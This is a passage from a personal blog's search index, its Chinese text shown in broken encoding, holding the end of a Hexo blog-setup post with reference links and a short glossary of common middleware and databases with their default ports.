title="3ã€ç¼–è¯‘å‡ºé”™"></a>3ã€ç¼–è¯‘å‡ºé”™</h2><p><img src="/img/Extracurricular-experience-hexo-build/image-20240517214405161.png" alt="image-20240517214405161"></p><p>è¿™é‡Œæ¨æµ‹æ˜¯å› ä¸ºå­˜åœ¨<code>[]æˆ–è€…ç©ºæ ¼</code>çš„åŸå› ï¼Œå°†<code>[]</code>æ¢æˆ<code>ã€ã€‘</code>å³å¯ã€‚åœ¨å¤´éƒ¨ä¸èƒ½éšä¾¿å‡ºç°<code>[]</code></p><h1 id="å…«ã€å‚è€ƒé“¾æ¥"><a href="#å…«ã€å‚è€ƒé“¾æ¥" class="headerlink" title="å…«ã€å‚è€ƒé“¾æ¥"></a>å…«ã€å‚è€ƒé“¾æ¥</h1><p>1ã€hexoåšå®¢æ­å»ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/305812430</span><br><span class="line">https://www.fomal.cc/posts/e593433d.html</span><br></pre></td></tr></table></figure><p>2ã€hexoä¸»é¢˜butterfly ç¾åŒ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/mjh1667002013/article/details/129290903</span><br><span class="line">https://butterfly.js.org/posts/4aa8abbe/</span><br><span class="line">hexo-Butterflyç¾åŒ–æ—¥è®°ï¼šhttps://blog.guole.fun/posts/butterfly-custom/index.html</span><br></pre></td></tr></table></figure><p>3ã€Hexoä¸­Buttefly ä¸»é¢˜è¢«ç™¾åº¦ï¼ŒBingç­‰æœç´¢å¼•æ“æ”¶å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://mtw.so/6adHnx</span><br><span class="line">https://moonshuo.cn/posts/6356.html</span><br></pre></td></tr></table></figure><p>4ã€è¯„è®ºåŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_33384402/article/details/107200465</span><br><span class="line">https://www.cnblogs.com/qisi007/p/13731562.html</span><br><span class="line">https://yeyeziblog.eu.org/2023/11/25/Tech/hexo/Hexo-butterfly%E5%A2%9E%E5%8A%A0%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/index.html</span><br></pre></td></tr></table></figure><p>5ã€æ›´å¤šé­”æ”¹æ•™ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://chenrui77.github.io/2022/01/25/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%96%87%E6%A1%A3(%E5%9B%9B)/</span><br></pre></td></tr></table></figure><p>6ã€Cloudflare å‚è€ƒæ•™ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Cloudflare ä¸ GitHub æ‰˜ç®¡å‚è€ƒ</span><br><span class="line">https://bileton.pages.dev/2024/01/01/hexo-github%E4%BB%8E0%E5%88%B01%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/22034763408</span><br><span class="line"></span><br><span class="line">// åŸŸåè§£æå‚è€ƒ</span><br><span class="line">https://www.oneyangcrown.top/posts/cloudflare-hosted-domain-cdn-ssl-guide/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å…¶ä»–ç»éªŒ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexoæ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åŸºç¡€çŸ¥è¯†ã€‘ç½‘ç»œå®‰å…¨å¸¸è§åè¯</title>
      <link href="/2024/02/11/Nouns-Basic/"/>
      <url>/2024/02/11/Nouns-Basic/</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸€ã€å¸¸è§çš„æ“ä½œç³»ç»Ÿ"><a href="#ä¸€ã€å¸¸è§çš„æ“ä½œç³»ç»Ÿ" class="headerlink" title="ä¸€ã€å¸¸è§çš„æ“ä½œç³»ç»Ÿ"></a>ä¸€ã€å¸¸è§çš„æ“ä½œç³»ç»Ÿ</h3><p><img src="/img/Nouns-Basic/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.png" alt="æ“ä½œç³»ç»Ÿ"></p><h3 id="äºŒã€å¸¸è§çš„ä¸­é—´ä»¶"><a href="#äºŒã€å¸¸è§çš„ä¸­é—´ä»¶" class="headerlink" title="äºŒã€å¸¸è§çš„ä¸­é—´ä»¶"></a>äºŒã€å¸¸è§çš„ä¸­é—´ä»¶</h3><ul><li>Apacheï¼šApacheæ˜¯æœ€æµè¡Œçš„WebæœåŠ¡å™¨ä¹‹ä¸€ï¼Œå®ƒä¹Ÿè¢«å¹¿æ³›ç”¨ä½œWebä¸­é—´ä»¶ã€‚Apacheæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€å’Œæ“ä½œç³»ç»Ÿï¼Œæä¾›äº†çµæ´»çš„é…ç½®å’Œæ‰©å±•æ€§ã€‚</li><li>Nginxï¼šNginxæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„WebæœåŠ¡å™¨å’Œåå‘ä»£ç†æœåŠ¡å™¨ï¼Œå®ƒä¹Ÿå¯ä»¥ä½œä¸ºWebä¸­é—´ä»¶ä½¿ç”¨ã€‚Nginxæ”¯æŒè´Ÿè½½å‡è¡¡ã€ç¼“å­˜ã€SSLåŠ å¯†ç­‰åŠŸèƒ½ï¼Œé€‚ç”¨äºé«˜å¹¶å‘å’Œåˆ†å¸ƒå¼åº”ç”¨åœºæ™¯ã€‚</li><li>IISï¼šIISæ˜¯Microsoftå¼€å‘çš„WebæœåŠ¡å™¨å’Œåº”ç”¨ç¨‹åºæœåŠ¡å™¨ï¼Œå®ƒä¹Ÿå¯ä»¥ä½œä¸ºWebä¸­é—´ä»¶ä½¿ç”¨ã€‚IISæ”¯æŒASP.NETã€PHPå’ŒNode.jsç­‰æŠ€æœ¯ï¼Œé€‚ç”¨äºWindowså¹³å°çš„Webåº”ç”¨ç¨‹åºå¼€å‘å’Œéƒ¨ç½²ã€‚</li><li>Tomcatï¼šTomcatæ˜¯ä¸€ä¸ªå¼€æºçš„Java Servletå®¹å™¨ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºWebä¸­é—´ä»¶ä½¿ç”¨ã€‚Tomcatæ”¯æŒJSPã€Servletå’ŒWebSocketç­‰æŠ€æœ¯ï¼Œé€‚ç”¨äºJava Webåº”ç”¨ç¨‹åºçš„éƒ¨ç½²å’Œç®¡ç†ã€‚</li><li>WebLogicæ˜¯Oracleå¼€å‘çš„Javaåº”ç”¨ç¨‹åºæœåŠ¡å™¨ï¼Œæ”¯æŒJ2EEæŠ€æœ¯è§„èŒƒå’Œå…¶ä»–WebæœåŠ¡åè®®ã€‚å®ƒæä¾›äº†é«˜åº¦å¯æ‰©å±•æ€§ã€é«˜å¯ç”¨æ€§ã€å®‰å…¨æ€§å’Œç®¡ç†æ€§ï¼Œé€‚ç”¨äºå¤§å‹ä¼ä¸šçº§åº”ç”¨ç¨‹åºçš„éƒ¨ç½²å’Œç®¡ç†ï¼Œæ”¯æŒJava Webåº”ç”¨ç¨‹åºçš„éƒ¨ç½²å’Œç®¡ç†ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒå…¶ä»–æŠ€æœ¯å¦‚SOAå’Œå¾®æœåŠ¡æ¶æ„ç­‰</li></ul><h3 id="ä¸‰ã€å¸¸è§çš„æ•°æ®åº“"><a href="#ä¸‰ã€å¸¸è§çš„æ•°æ®åº“" class="headerlink" title="ä¸‰ã€å¸¸è§çš„æ•°æ®åº“"></a>ä¸‰ã€å¸¸è§çš„æ•°æ®åº“</h3><ul><li>å…³ç³»å‹æ•°æ®åº“ï¼šå¦‚MySQLï¼ˆ3306ï¼‰ã€SQL Serverï¼ˆ1433å¸¸å¸¸é…åˆIISä¸­é—´ä»¶åœ¨win serveræœºå™¨ä¸Šè¿è¡Œï¼‰ã€Oracleï¼ˆ1521ï¼‰ã€PostgreSQLï¼ˆ5432ï¼‰ç­‰ï¼Œå®ƒä»¬ä½¿ç”¨è¡¨æ ¼å½¢å¼ç»„ç»‡æ•°æ®ï¼Œé€šè¿‡å…³ç³»è¿›è¡Œæ•°æ®çš„å­˜å‚¨å’Œç®¡ç†ã€‚</li><li>éå…³ç³»å‹æ•°æ®åº“ï¼šå¦‚MongoDBï¼ˆ27017ï¼‰ã€Redisï¼ˆ6379ï¼‰ç­‰ï¼Œå®ƒä»¬ä¸ä½¿ç”¨ä¼ ç»Ÿçš„è¡¨æ ¼ç»“æ„ï¼Œè€Œæ˜¯é‡‡ç”¨é”®å€¼å¯¹ã€æ–‡æ¡£ã€åˆ—æ—ã€å›¾ç­‰æ–¹å¼è¿›è¡Œæ•°æ®çš„å­˜å‚¨å’ŒæŸ¥è¯¢ã€‚</li></ul><p>å…¶ä»–å¸¸è§ç½‘ç»œå®‰å…¨è¯æ±‡ï¼š<a href="https://zhuanlan.zhihu.com/p/575141390">https://zhuanlan.zhihu.com/p/575141390</a></p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
